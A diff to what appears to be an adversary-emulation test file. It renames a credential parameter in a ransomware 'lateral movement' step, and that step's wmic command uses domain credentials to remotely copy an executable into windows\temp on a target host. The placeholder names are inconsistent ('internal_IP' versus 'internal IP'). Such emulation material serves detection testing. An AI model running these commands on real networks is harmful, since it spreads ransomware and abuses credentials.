@@ -731,15 +731,15 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{Ransomware_recipient} /user:#{"domain_username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+          start wmic /node:#{Ransomware_recipient} /user:#{"domain_user"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 
   input_arguments:
     Ransomware_recipient:
       description: Hostname or IP address
       type: string
       default: 127.0.0.1
-    domain_username:
-      description: domain\\username
+    domain_user:
+      description: domain\\user
       type: string
       default: user
     password:
@@ -752,7 +752,7 @@
 
   executors:
     - name: command_prompt
-      command: start wmic /node:#{Ransomware_recipient} /user:#{"domain_username"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+      command: start wmic /node:#{Ransomware_recipient} /user:#{"domain_user"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 
 # Phase 2: Lateral Movement - Ransomware
 
